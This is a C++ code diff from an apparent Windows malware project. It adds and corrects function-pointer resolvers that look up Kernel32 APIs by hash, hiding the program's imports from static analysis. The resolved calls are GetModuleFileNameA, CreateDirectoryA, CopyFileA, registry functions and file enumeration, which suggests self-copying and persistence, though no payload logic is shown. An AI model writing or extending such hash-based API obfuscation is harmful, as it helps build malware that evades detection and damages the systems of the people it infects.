@@ -7,12 +7,12 @@ using customGetEnvironmentVariableA = LSTATUS(NTAPI*)(
     DWORD nSize
     );
 
-using customCreateDirectoryA = LSTATUS(NTAPI*)(
+using customCreateDirectoryA = BOOL(NTAPI*)(
     LPCSTR lpPathName,
     LPSECURITY_ATTRIBUTES lpSecurityAttributes
     );
 
-using customGetModuleFileNameA = LSTATUS(NTAPI*)(
+using customGetModuleFileNameA = DWORD(NTAPI*)(
     HMODULE hModule,
     LPSTR lpFilename,
     DWORD nSize
@@ -39,12 +39,29 @@ using customRegCloseKey = LSTATUS(NTAPI*)(
     HKEY hKey
     );
 
-using customCopyFileA = LSTATUS(NTAPI*)(
+using customCopyFileA = BOOL(NTAPI*)(
     LPCSTR lpExistingFileName,
     LPCSTR lpNewFileName,
     BOOL bFailIfExists
     );
 
+using customGetModuleHandleA = HMODULE(NTAPI*)(
+    LPCSTR lpModuleName
+);
+
+using customFindFirstFileA = HANDLE(NTAPI*)(
+    LPCSTR lpFileName,
+    LPWIN32_FIND_DATAA lpFindFileData
+);
+
+using customFindNextFileA = BOOL(NTAPI*)(
+    HANDLE hFindFile,
+    LPWIN32_FIND_DATAA lpFindFileData
+);
+
+using customFindClose = BOOL(NTAPI*)(
+    HANDLE hFindFile
+);
 
 customGetEnvironmentVariableA GetEnvironmentVariableA_c = (customGetEnvironmentVariableA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"GetEnvironmentVariableA"));
 
@@ -58,4 +75,12 @@ customGetModuleFileNameA GetModuleFileNameA_c = (customGetModuleFileNameA)getFun
 
 customCreateDirectoryA CreateDirectoryA_c = (customCreateDirectoryA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"CreateDirectoryA"));
 
-customCopyFileA CopyFileA_c = (customCopyFileA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"customCopyFileA"));
+customCopyFileA CopyFileA_c = (customCopyFileA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"CopyFileA"));
+
+customGetModuleHandleA GetModuleHandleA_c = (customGetModuleHandleA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"GetModuleHandleA"));
+
+customFindFirstFileA FindFirstFileA_c = (customFindFirstFileA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"FindFirstFileA"));
+
+customFindNextFileA FindNextFileA_c = (customFindNextFileA)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"FindNextFileA"));
+
+customFindClose FindClose_c = (customFindClose)getFunctionAddressByHash((char*)"Kernel32", getHashFromString((char*)"FindClose"));
